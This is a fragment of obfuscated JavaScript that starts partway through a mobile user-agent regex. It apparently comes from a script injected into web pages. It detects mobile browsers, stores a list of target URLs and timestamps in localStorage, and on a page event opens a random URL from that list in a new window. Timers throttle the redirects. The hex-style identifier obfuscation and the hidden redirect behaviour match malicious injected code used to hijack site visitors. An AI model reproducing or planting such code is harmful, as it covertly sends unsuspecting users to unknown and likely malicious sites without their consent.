)|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());